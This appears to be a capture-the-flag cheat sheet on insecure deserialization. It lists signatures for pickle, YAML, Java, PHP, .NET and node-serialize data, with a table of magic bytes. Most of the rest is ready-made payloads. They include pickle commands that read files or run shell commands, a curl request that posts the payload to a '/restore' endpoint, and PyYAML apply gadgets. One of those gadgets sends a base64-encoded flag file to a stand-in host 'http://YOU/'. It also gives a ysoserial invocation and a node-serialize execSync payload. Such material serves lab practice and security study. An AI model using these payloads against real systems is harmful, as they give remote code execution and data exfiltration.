# Insecure deserialization (CWE-502)

**Signs**: "restore session/workspace/state", "import profile", cookies or params holding opaque
base64 blobs. Hint "what it carries is not data — the vault runs what it holds".
Deserialization is **reconstruction = execution**: the format carries a recipe the runtime runs.

## Recognise the format
| Starts with (raw / base64) | Format |
|---|---|
| `\x80\x04\x95` / `gASV`, `gAN`, `KGRw` | Python **pickle** |
| `!!python/object` in YAML | PyYAML unsafe `yaml.load` |
| `\xac\xed\x00\x05` / `rO0AB` | Java serialization |
| `O:8:"stdClass":` / `a:2:{` | PHP `serialize()` |
| `{"$type":` | .NET Json.NET TypeNameHandling |
| `_$$ND_FUNC$$_` | node-serialize |

## Python pickle → RCE / file read
```bash
python scripts/injection/pickle_payload.py --read /flag/flag           # (open, ('/flag/flag',))
python scripts/injection/pickle_payload.py --cmd 'cat /flag/flag'      # os.popen(...).read() variant
python scripts/injection/pickle_payload.py --cmd 'id' --system         # os.system (output not returned)
curl -s --data-urlencode "blob=$(python scripts/injection/pickle_payload.py --read /flag/flag)" $T/restore
```
Pick the gadget according to what the app does with the object: if it **prints/reads** it,
return a string or file object (`open`, `subprocess.check_output`); `os.system` returns only an int.

## PyYAML
```yaml
!!python/object/apply:subprocess.check_output [["cat", "/flag/flag"]]
!!python/object/apply:os.system ["curl http://YOU/$(base64 -w0 /flag/flag)"]
```

## Java
`ysoserial` gadget chains: `java -jar ysoserial.jar CommonsCollections5 'cmd' | base64 -w0`
(needs a gadget library on the target's classpath).

## PHP
Object injection via `unserialize()` + magic methods (`__wakeup`, `__destruct`); `phpggc` for
framework gadget chains (Laravel, Monolog, Guzzle…).

## Node
`node-serialize`: `{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"}`

Seen in: `inj12` (SessionVault: `pickle.loads` on POST `/restore` `blob`; preview reads file-like objects).
